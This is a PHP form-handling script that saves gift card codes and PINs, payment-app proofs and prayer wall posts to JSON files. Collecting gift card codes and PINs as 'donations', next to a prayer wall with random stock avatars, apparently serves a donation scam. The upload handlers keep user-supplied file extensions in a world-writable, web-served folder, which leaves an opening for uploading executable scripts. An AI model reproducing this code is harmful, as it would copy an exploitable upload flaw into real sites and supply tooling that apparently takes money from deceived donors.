<?php
// save.php - Handles data saving to local JSON files without SQL

// Enable basic error handling
header('Content-Type: text/html; charset=utf-8');

// Ensure uploads folder exists
if (!is_dir('uploads')) {
    mkdir('uploads', 0777, true);
}

// Function to read JSON file securely
function get_json_data($filename) {
    if (!file_exists($filename)) {
        return [];
    }
    $content = file_get_contents($filename);
    return json_decode($content, true) ?? [];
}

// Function to write JSON file securely
function save_json_data($filename, $data) {
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // 1. PROCESS GIFT CARD SUBMISSIONS
    if ($action === 'submit_giftcard') {
        $donor_email = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
        $card_type   = htmlspecialchars($_POST['card_type'] ?? '');
        $card_code   = htmlspecialchars($_POST['card_code'] ?? '');
        $card_pin    = htmlspecialchars($_POST['card_pin'] ?? '');
        $amount      = floatval($_POST['amount'] ?? 0);
        $image_path  = '';

        // Handle Image Screenshot Upload
        if (isset($_FILES['card_image']) && $_FILES['card_image']['error'] === UPLOAD_ERR_OK) {
            $ext = pathinfo($_FILES['card_image']['name'], PATHINFO_EXTENSION);
            $target = "uploads/gc_" . time() . "_" . rand(1000, 9999) . "." . $ext;
            if (move_uploaded_file($_FILES['card_image']['tmp_name'], $target)) {
                $image_path = $target;
            }
        }

        $entry = [
            'id'          => time(),
            'donor_email' => $donor_email,
            'card_type'   => $card_type,
            'card_code'   => $card_code,
            'card_pin'    => $card_pin,
            'amount'      => $amount,
            'image_path'  => $image_path,
            'created_at'  => date('Y-m-d H:i:s')
        ];

        $existing = get_json_data('gift_cards.json');
        array_unshift($existing, $entry); // Put newest entry on top
        save_json_data('gift_cards.json', $existing);

        header("Location: index.php?status=success_gc");
        exit;
    }

    // 2. PROCESS DIRECT PAYMENT PROOFS (Zelle, Cash App, PayPal, etc.)
    if ($action === 'submit_payment_proof') {
        $donor_name     = htmlspecialchars($_POST['donor_name'] ?? '');
        $donor_email    = filter_var($_POST['donor_email'] ?? '', FILTER_SANITIZE_EMAIL);
        $payment_method = htmlspecialchars($_POST['payment_method'] ?? '');
        $amount         = floatval($_POST['amount'] ?? 0);
        $receipt_number = "MIGHTY-" . strtoupper(substr(md5(uniqid()), 0, 8));
        $proof_image    = '';

        if (isset($_FILES['proof_image']) && $_FILES['proof_image']['error'] === UPLOAD_ERR_OK) {
            $ext = pathinfo($_FILES['proof_image']['name'], PATHINFO_EXTENSION);
            $target = "uploads/proof_" . time() . "_" . rand(1000, 9999) . "." . $ext;
            if (move_uploaded_file($_FILES['proof_image']['tmp_name'], $target)) {
                $proof_image = $target;
            }
        }

        $entry = [
            'id'             => time(),
            'receipt_number' => $receipt_number,
            'donor_name'     => $donor_name,
            'donor_email'    => $donor_email,
            'payment_method' => $payment_method,
            'amount'         => $amount,
            'proof_image'    => $proof_image,
            'created_at'     => date('Y-m-d H:i:s')
        ];

        $existing = get_json_data('proofs.json');
        array_unshift($existing, $entry);
        save_json_data('proofs.json', $existing);

        header("Location: index.php?status=success_proof&receipt=" . $receipt_number);
        exit;
    }

    // 3. PROCESS PRAYER WALL POSTS
    if ($action === 'submit_prayer') {
        $author   = htmlspecialchars($_POST['author'] ?? '');
        $location = htmlspecialchars($_POST['location'] ?? '');
        $message  = htmlspecialchars($_POST['message'] ?? '');
        $avatar   = "https://i.pravatar.cc/100?img=" . rand(1, 70);

        $entry = [
            'id'         => time(),
            'author'     => $author,
            'location'   => $location,
            'message'    => $message,
            'avatar_url' => $avatar,
            'created_at' => date('Y-m-d H:i:s')
        ];

        $existing = get_json_data('prayers.json');
        array_unshift($existing, $entry);
        save_json_data('prayers.json', $existing);

        header("Location: index.php?status=success_prayer");
        exit;
    }
}

// Redirect back if accessed directly
header("Location: index.php");
exit;
?>
